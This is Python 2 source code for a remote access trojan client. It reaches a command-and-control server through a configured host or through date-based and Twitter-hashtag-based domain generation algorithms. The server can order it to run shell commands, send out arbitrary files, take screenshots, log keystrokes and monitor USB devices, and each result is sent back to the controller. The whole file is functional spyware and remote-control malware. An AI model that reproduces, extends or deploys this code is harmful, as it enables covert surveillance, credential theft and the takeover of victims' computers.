import datetime
import socket               
import os
import screenshot
import urllib2
from bs4 import BeautifulSoup 
from keylogger import keylogger
from usb_monitor import usb_monitor
import dns.resolver

def cmd_module(com,p):
    global host
    print 'exec cmd_module'

    #execute cmd command & send to server over new connection
    os.system(com + ' > cmd.txt')
    
    sf = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sf.connect((host, p))
    f = open('cmd.txt','rb')
    data = f.read(1024)
    while data:
        sf.send(data)
        data = f.read(1024)
    #print "Sending Completed"
    sf.close()


def file_module(path,p):
    global host
    print 'exec file_module'

    sf = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sf.connect((host, p))
    try:
        f = open(path,'rb')
        data = f.read(1024)
        while data:
            sf.send(data)
            data = f.read(1024)
        #print "Sending Completed"
    except:
        sf.send('error occured')
        print 'error in sending file'
    sf.close()
    

def screenshot_module(p):
    global host
    #print host
    print 'exec screenshot_module'

    #take screenshot & send to server over new connection
    screenshot.capture()
    
    sf = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sf.connect((host, p))
    f = open('scr.jpg','rb')
    data = f.read(1024)
    while data:
        sf.send(data)
        data = f.read(1024)
    #print "Sending Completed"
    sf.close()    
    
def keylogger_module_start():
    global host
    print 'exec keylogger_module_start'

    #start keylogger
    keylogger().startKeylogger()
    f = open('keylogs.txt','wb')
    f.close()
    

def keylogger_module_fetch(p):
    global host
    print 'exec keylogger_module_fetch'

    #send logs to server
    sf = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sf.connect((host, p))
    f = open('keylogs.txt','rb')
    data = f.read(1024)
    while data:
        sf.send(data)
        data = f.read(1024)
    #print "Sending Completed"
    sf.close() 
    
        
def usb_monitor_module(p):
   
    global host
    print 'exec usb_monitor_module'
    usb_monitor().start(host,p)


def searchDomainOnline(word1,word2):
    #word1 = 'vineeth'
    #word2 = 'panda'

    url = 'http://www.namemesh.com/domain-name-search/'+word1+'%20'+word2+'?show=1'

    con = urllib2.urlopen(url)
    content = con.read()
    #print content
    soup = BeautifulSoup(content,'html.parser')

    spanList = soup.findAll('div',class_='trit pack')
    spanItem = spanList[0]
    domain_url = spanItem['terms'].split(',')[0]
    return domain_url.split('"')[1]+'.com'
    

def generateTwitterDGA(catg):
    url = ''
    catg = catg.lower()
    if catg == 'sport':
        #sport
        url = 'https://twitter.com/i/streams/category/687094923246440462'  
    elif catg == 'entertainment':
        #entertainment
        url = 'https://twitter.com/i/streams/category/687094923246440457'
    elif catg == 'music':
        #music
        url = 'https://twitter.com/i/streams/category/687094923246440475'
    else:
        return 'error'

    con = urllib2.urlopen(url)
    content = con.read()

    #print content
    soup = BeautifulSoup(content,'html.parser')

    aList = soup.findAll('a',class_='twitter-hashtag pretty-link js-nav')
    word1 = aList[0]['href'].split('/')[2].split('?')[0].lower()
    word2 = aList[1]['href'].split('/')[2].split('?')[0].lower()
    print 'word1=',word1
    print 'word2=',word2
    #print 'Available domain: ', generate(word1,word2)
    return searchDomainOnline(word1,word2)


def generateTimeDGA():

    x = datetime.date.today()
    year = x.year
    month = x.month
    day = x.day
    #hour = int(request.form['hour'])
    #minute = int(request.form['minute'])

    domain = ""

    for i in range(16):
        year = ((year ^ 8 * year) >> 11) ^ ((year & 0xFFFFFFF0) << 17)
        month = ((month ^ 4 * month) >> 25) ^ 16 * (month & 0xFFFFFFF8)
        day = ((day ^ (day << 13)) >> 19) ^ ((day & 0xFFFFFFFE) << 12)
        domain += chr(((year ^ month ^ day) % 25) + 97)

    domain = domain+'.nsproject.in'
    return domain  

        
############################### MAIN MODULE ############################

host = ''
port = 0   ##port = 12344
dns_server = ''

    
try:
    f = open('client.config','r')
    line = f.readline().split('=')
    
    if int(line[1]) == 0:
        port = int(f.readline().split('=')[1])
        host = f.readline().split('=')[1].rstrip()
    elif int(line[1]) == 1:
        port = int(f.readline().split('=')[1])
        tmp = f.readline()
        dns_server = f.readline().split('=')[1].rstrip()
        host = generateTimeDGA()
    else:
        port = int(f.readline().split('=')[1])
        tmp = f.readline()
        dns_server = f.readline().split('=')[1].rstrip()
        host = generateTwitterDGA('Music')  #Sport, Entertainment, Music
        
    f.close()

    #print host,port
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         
    print 'Resolving domain ',host


    if int(line[1]) != 0:
        print 'contacting dns_server', dns_server
        my_resolver = dns.resolver.Resolver()
        my_resolver.nameservers = [dns_server]
        answer = my_resolver.query(host,'A')
        for rdata in answer:
            host = rdata
        host = host.address    
        
    s.connect((host, port))    


    while True:
        data = s.recv(1024).split(':')
        command = data[0]
        p = int(data[1])
        #print 'recieved command: ', command
        
        if command == 'bye':
            break    
        else:
            if command == 'exec cmd':
                param = s.recv(1024)
                cmd_module(param,p)
            elif command == 'exec file':
                param = s.recv(1024)
                file_module(param,p)    
            elif command == 'exec screenshot':
                screenshot_module(p)
            elif command == 'exec keylogger_start':
                keylogger_module_start()
            elif command == 'exec keylogger_fetch':
                keylogger_module_fetch(p)
            elif command == 'exec usb_monitor':
                usb_monitor_module(p)

    s.close                     
except:
    print 'Connection Error !!',host,port 
